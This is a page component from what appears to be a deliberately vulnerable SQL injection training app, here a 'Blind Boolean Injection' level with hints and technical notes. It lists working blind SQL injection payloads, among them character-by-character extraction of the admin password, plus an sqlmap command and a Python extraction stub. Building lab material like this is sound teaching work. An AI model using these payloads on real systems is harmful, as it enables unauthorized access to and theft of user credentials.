'use client';

import LoginForm from '@/components/LoginForm';
import { LoginCredentials, ApiResponse } from '@/types';

export default function Level4() {
  const handleLogin = async (credentials: LoginCredentials): Promise<ApiResponse> => {
    try {
      const response = await fetch('/api/level4', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      });

      return await response.json();
    } catch (error) {
      return {
        success: false,
        error: 'Failed to connect to server'
      };
    }
  };

  const hints = [
    "This level doesn't show database errors or results directly",
    "Look for differences in application behavior (true/false responses)",
    "Try: ' AND (SELECT COUNT(*) FROM users) > 0--",
    "Use substring functions to extract data character by character",
    "Example: ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--"
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12">
      <div className="container mx-auto px-6">
        <LoginForm
          level={4}
          title="Blind Boolean Injection"
          description="This level simulates a blind SQL injection scenario where you can only infer information based on the application's true/false responses. No direct database output is shown, making data extraction more challenging."
          onSubmit={handleLogin}
          hints={hints}
          isVulnerable={true}
        />

        {/* Technical Details */}
        <div className="mt-12 max-w-4xl mx-auto">
          <div className="vulnerability-card rounded-lg p-8">
            <h2 className="text-2xl font-semibold mb-6 text-cyber-blue">
              🔍 Technical Details
            </h2>
            
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Blind Injection Techniques:</h3>
                <div className="code-block">
{`-- Test if injection point exists
' AND 1=1--        (should return normal response)
' AND 1=2--        (should return different response)

-- Enumerate database structure
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT COUNT(*) FROM users) > 5--
' AND (SELECT COUNT(*) FROM users) > 10--

-- Extract data character by character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'b'--
' AND (SELECT SUBSTRING(username,2,1) FROM users LIMIT 1) = 'a'--`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Response Analysis:</h3>
                <ul className="space-y-2 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    True condition: "Login failed" or normal response
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    False condition: Different error or response pattern
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Response time differences may also indicate true/false
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    HTTP status codes might change based on query result
                  </li>
                </ul>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Advanced Boolean Techniques:</h3>
                <div className="code-block">
{`-- Binary search for efficiency
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 96--

-- Check table existence
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='admin_users') > 0--

-- Version detection
' AND (SELECT SUBSTRING(version(),1,8)) = 'PostgreS'--`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Automation Tools:</h3>
                <div className="code-block">
{`# SQLMap for automated blind injection
sqlmap -u "http://target/api/level4" --data="username=test&password=test" --method=POST --technique=B

# Custom Python script for boolean-based extraction
import requests
import string

def extract_data(position, table, column):
    for char in string.printable:
        payload = f"' AND (SELECT SUBSTRING({column},{position},1) FROM {table} LIMIT 1) = '{char}'--"
        # Send request and analyze response
        
# Burp Suite Intruder for character-by-character extraction`}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
